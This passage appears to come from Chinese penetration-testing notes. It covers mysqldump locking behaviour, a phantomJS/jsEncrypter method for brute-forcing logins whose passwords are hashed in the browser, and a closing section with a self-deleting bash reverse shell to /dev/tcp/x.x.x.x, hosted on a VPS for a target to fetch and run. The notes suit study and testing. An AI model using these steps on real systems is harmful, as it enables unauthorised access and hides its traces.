class="comment">/*!40100 SET @@SQL_MODE=&#x27;&#x27; */</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.147069</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="comment">/*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.147165</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  FLUSH TABLES</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.182528</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  FLUSH TABLES <span class="keyword">WITH</span> READ LOCK</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.182675</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;gtid\_mode&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.184634</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SELECT</span> LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;UNDO LOG&#x27;</span> <span class="keyword">AND</span> FILE_NAME <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">AND</span> LOGFILE_GROUP_NAME <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">AND</span> LOGFILE_GROUP_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> LOGFILE_GROUP_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;DATAFILE&#x27;</span> <span class="keyword">AND</span> TABLESPACE_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.PARTITIONS <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">IN</span> (<span class="string">&#x27;test&#x27;</span>))) <span class="keyword">GROUP</span> <span class="keyword">BY</span> LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE <span class="keyword">ORDER</span> <span class="keyword">BY</span> LOGFILE_GROUP_NAME</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.192668</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;DATAFILE&#x27;</span> <span class="keyword">AND</span> TABLESPACE_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.PARTITIONS <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">IN</span> (<span class="string">&#x27;test&#x27;</span>)) <span class="keyword">ORDER</span> <span class="keyword">BY</span> TABLESPACE_NAME, LOGFILE_GROUP_NAME</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.194757</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;ndbinfo\_version&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196137</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Init DB  test</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196195</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">show</span> tables</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196398</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">show</span> <span class="keyword">table</span> status <span class="keyword">like</span> <span class="string">&#x27;t\_test&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196592</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SET</span> SQL_QUOTE_SHOW_CREATE<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196634</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;binary&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196667</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> `t\_test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196748</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.196808</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">show</span> fields <span class="keyword">from</span> `t\_test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197078</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">show</span> fields <span class="keyword">from</span> `t\_test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197273</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SELECT</span> <span class="comment">/*!40001 SQL_NO_CACHE */</span> <span class="operator">*</span> <span class="keyword">FROM</span> `test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197395</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;binary&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197429</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  use `test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197462</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">select</span> @<span class="variable">@collation</span>_database</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197507</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SHOW</span> TRIGGERS <span class="keyword">LIKE</span> <span class="string">&#x27;t\_&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.197791</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T10:<span class="number">33</span>:<span class="number">06.458820</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1893</span> Quit</span><br></pre></td></tr></table></figure><p>​    他会在开始，执行一次FLUSH TABLES WITH READ LOCK，在导出完成，退出会话的时候，自动释放读锁。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -udumper -pdumper --single-transaction <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>​    在开始执行了SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ，设置了RR隔离级别，并通过START TRANSACTION /*!40100 WITH CONSISTENT SNAPSHOT */，开启了事务，UNLOCK TABLES解锁了所有的表，我们能注意到，他在执行导出操作前，设置了还原点，SAVEPOINT sp，并且在每张表的导出操作前，都执行了ROLLBACK TO SAVEPOINT sp，回到还原点，通过这种操作，保证了读数据的一致性，导出所有的表，然后再执行了RELEASE SAVEPOINT sp。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.423617</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> <span class="keyword">Connect</span>  root<span class="variable">@localhost</span> <span class="keyword">on</span>  <span class="keyword">using</span> Socket</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.423747</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="comment">/*!40100 SET @@SQL_MODE=&#x27;&#x27; */</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.423816</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="comment">/*!40103 SET TIME_ZONE=&#x27;+00:00&#x27; */</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.423892</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SET</span> SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.423940</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">START</span> TRANSACTION <span class="comment">/*!40100 WITH CONSISTENT SNAPSHOT */</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.424145</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;gtid\_mode&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.426431</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  UNLOCK TABLES</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.426624</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SELECT</span> LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;UNDO LOG&#x27;</span> <span class="keyword">AND</span> FILE_NAME <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">AND</span> LOGFILE_GROUP_NAME <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">AND</span> LOGFILE_GROUP_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> LOGFILE_GROUP_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;DATAFILE&#x27;</span> <span class="keyword">AND</span> TABLESPACE_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.PARTITIONS <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">IN</span> (<span class="string">&#x27;test&#x27;</span>))) <span class="keyword">GROUP</span> <span class="keyword">BY</span> LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE <span class="keyword">ORDER</span> <span class="keyword">BY</span> LOGFILE_GROUP_NAME</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.431603</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE <span class="keyword">FROM</span> INFORMATION_SCHEMA.FILES <span class="keyword">WHERE</span> FILE_TYPE <span class="operator">=</span> <span class="string">&#x27;DATAFILE&#x27;</span> <span class="keyword">AND</span> TABLESPACE_NAME <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> TABLESPACE_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.PARTITIONS <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="keyword">IN</span> (<span class="string">&#x27;test&#x27;</span>)) <span class="keyword">ORDER</span> <span class="keyword">BY</span> TABLESPACE_NAME, LOGFILE_GROUP_NAME</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.433579</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;ndbinfo\_version&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.434791</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Init DB  test</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.434852</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SAVEPOINT</span> sp</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.434906</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">show</span> tables</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435113</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">show</span> <span class="keyword">table</span> status <span class="keyword">like</span> <span class="string">&#x27;t\_test&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435337</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SET</span> SQL_QUOTE_SHOW_CREATE<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435388</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;binary&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435434</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> `t\_test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435509</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435567</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">show</span> fields <span class="keyword">from</span> `t\_test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.435859</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">show</span> fields <span class="keyword">from</span> `t\_test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436082</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SELECT</span> <span class="comment">/*!40001 SQL_NO_CACHE */</span> <span class="operator">*</span> <span class="keyword">FROM</span> `test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436228</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;binary&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436295</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  use `test`</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436346</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">select</span> @<span class="variable">@collation</span>_database</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436406</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SHOW</span> TRIGGERS <span class="keyword">LIKE</span> <span class="string">&#x27;t\_test&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436702</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">SET</span> SESSION character_set_results <span class="operator">=</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.436765</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> <span class="keyword">SAVEPOINT</span> sp</span><br><span class="line">...</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.624624</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">ROLLBACK</span> <span class="keyword">TO</span> <span class="keyword">SAVEPOINT</span> sp</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.624650</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Query  <span class="keyword">RELEASE</span> <span class="keyword">SAVEPOINT</span> sp</span><br><span class="line"><span class="number">2021</span><span class="number">-06</span><span class="number">-03</span>T11:<span class="number">07</span>:<span class="number">08.662944</span><span class="operator">+</span><span class="number">08</span>:<span class="number">00</span>   <span class="number">1899</span> Quit</span><br></pre></td></tr></table></figure><p>​    从导出过程对数据库正常使用的影响程度上，–single-transaction&lt;–lock-all-tables&lt;–lock-tables，依次递减，如果从数据一致性的角度，推荐使用–single-transaction。</p><p>参考：<a class="link"   href="https://blog.csdn.net/bisal/article/details/118917808" >https://blog.csdn.net/bisal/article/details/118917808<i class="fas fa-external-link-alt"></i></a></p><p>​    脱某个表和多个表:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法：mysqldump <span class="operator">-</span>h1主机名 <span class="operator">-</span>p端口 <span class="operator">-</span>u用户名 <span class="operator">-</span>p密码 库名 表名 表名 <span class="operator">&gt;</span>文件名.<span class="keyword">sql</span></span><br><span class="line">例子：mysqldump <span class="operator">-</span>h127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>p3306 <span class="operator">-</span>uroot <span class="operator">-</span>proot mysql t1 t2 <span class="operator">&gt;</span><span class="operator">/</span>data<span class="operator">/</span>backup<span class="operator">/</span>cmdb_t1_t2.sql</span><br></pre></td></tr></table></figure><p>​    同时备份多个库:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">格式：mysqldump <span class="operator">-</span>h主机名 <span class="operator">-</span>P端口 <span class="operator">-</span>u用户名 <span class="operator">-</span>p密码 <span class="comment">--databases 数据库名1 数据库名2 数据库名3 &gt; 文件名.sql</span></span><br><span class="line">例如：mysqldump <span class="operator">-</span>h192<span class="number">.168</span><span class="number">.1</span><span class="number">.100</span> <span class="operator">-</span>uroot <span class="operator">-</span>ppassword <span class="comment">--databases cmdb bbs blog &gt; /data/backup</span></span><br><span class="line">如果不行，试试不要<span class="comment">--databases</span></span><br></pre></td></tr></table></figure><p>​    备份数据库结构不备份数据:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">格式：mysqldump <span class="operator">-</span>h主机名 <span class="operator">-</span>P端口 <span class="operator">-</span>u用户名 <span class="operator">-</span>p密码 <span class="comment">--no-data 数据库名1 数据库名2 数据库名3 &gt; 文件名.sql</span></span><br><span class="line">例如：mysqldump <span class="comment">--no-data –databases db1 db2 cmdb &gt; /data/backup/structure.sql</span></span><br></pre></td></tr></table></figure><hr><h3 id="前端加密"><a href="#前端加密" class="headerlink" title="前端加密"></a>前端加密</h3><h4 id="phantomJS"><a href="#phantomJS" class="headerlink" title="phantomJS"></a>phantomJS</h4><p>​    学习c0ny1师傅的文章，记录一下。原文地址:<a class="link"   href="https://gv7.me/articles/2017/jsEncrypter/" >https://gv7.me/articles/2017/jsEncrypter/<i class="fas fa-external-link-alt"></i></a></p><p>​    对于前端靶场使用c0ny1师傅提供的靶场。首先在电脑上需要phantomJS软件。phantomJS是一个没有界面的浏览器，除了不能浏览，其他的和正常浏览器一样。使用它来执行我们编写好的脚本。</p><p>​    选择sha1进行，抓包。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074258.jpg"                      alt="image-20220901145940027"                ></p><p>​    可看到密码部分加密，我们把靶场里sha1的加密放在phantomJS里运行</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074259.jpg"                      alt="image-20220901150900129"                ></p><p>​    然后插件连接并测试，即可获得加密后的数据</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074300.jpg"                      alt="image-20220901150942926"                ></p><p>​    使用数据爆破即可，或者在payload processing里选择插件即可。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074306.gif"                      alt="crack"                ></p><p>​    我们看看JsEncrypter里的内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载实现加密算法的js脚本</span></span><br><span class="line"><span class="keyword">var</span> wasSuccessful = phantom.<span class="title function_">injectJs</span>(<span class="string">&#x27;sha1.js&#x27;</span>);<span class="comment">/*引入实现加密的js文件*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">js_encrypt</span>(<span class="params">payload</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> newpayload;</span><br><span class="line"><span class="comment">/**********在这里编写调用加密函数进行加密的代码************/</span></span><br><span class="line">newpayload = <span class="title function_">hex_sha1</span>(payload);</span><br><span class="line"><span class="comment">/**********************************************************/</span></span><br><span class="line"><span class="keyword">return</span> newpayload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074308.jpg"                      alt="image-20220903225714934"                ></p><p>​    通常来说，如果一个网站的 js 文件没有做混淆，并能轻松找到加密函数，且加密算法比较简单的话，其实是不需要导入 js 文件的，可以直接将加密函数复制或者自己编写即可，但是往往加密算法的实现比较复杂，需要引入许多依赖，所以还是导入较好，后续编写加密算法再调用其中的依赖。</p><p>​    以下提供两种解决办法：</p><p>​    1、导入所有js文件</p><p>​    2、通过搜索关键字导入js文件，可搜索encrypt、aes、des、md5、key、iv、rsa等</p><p>​    通过分析得到：</p><p>​    我们可以通过全局搜索接口名称，然后通过路由寻找加密函数，然后一步一步分析。</p><p>​    <a class="link"   href="https://www.cnblogs.com/wjrblogs/p/12850094.html" >https://www.cnblogs.com/wjrblogs/p/12850094.html<i class="fas fa-external-link-alt"></i></a></p><h4 id="定位相关"><a href="#定位相关" class="headerlink" title="定位相关"></a>定位相关</h4><h5 id="onclick定位法"><a href="#onclick定位法" class="headerlink" title="onclick定位法"></a>onclick定位法</h5><p>​    有时候在触发提交表单的标签中会存在一个onClik属性，该属性的值正好是一个js函数。而这个函数往往就是我们要找的数据加密函数。我们只需要找到它定义的地方即可。</p><hr><h3 id="Linux下载文件"><a href="#Linux下载文件" class="headerlink" title="Linux下载文件"></a>Linux下载文件</h3><p>​    在渗透的过程中，遇见的bash无法执行怎么办，或者目标机器没有nc怎么办，再或者，等等一系列原因导致无法利用。提供以下几种办法:</p><h4 id="1、curl"><a href="#1、curl" class="headerlink" title="1、curl"></a>1、curl</h4><p>​    在服务器编写一个脚本 ，脚本的内容是bash反弹，并且删除原脚本，在利用内存马让目标机器去请求执行。</p><p>​    VPS脚本1:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/8989 0&gt;&amp;1 &amp;</span><br><span class="line"><span class="built_in">rm</span> <span class="variable">$0</span>     <span class="comment">#删除当前这个脚本</span></span><br></pre></td></tr></table></figure><p>​    VPS记得把脚本用Python起个服务挂起来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 